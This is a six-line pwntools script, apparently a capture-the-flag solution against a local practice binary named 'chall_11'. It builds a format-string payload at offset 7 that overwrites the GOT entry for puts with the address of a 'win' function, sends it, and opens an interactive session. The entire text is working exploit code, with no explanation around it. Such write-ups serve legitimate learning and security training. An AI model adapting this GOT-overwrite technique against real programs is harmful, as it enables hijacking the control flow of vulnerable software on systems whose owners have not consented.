p = process("./chall_11")
elf = ELF("./chall_11")
payload = fmtstr_payload(7, {elf.got.puts: elf.sym.win}, write_size="byte")
payload
p.sendline(payload)
p.interactive()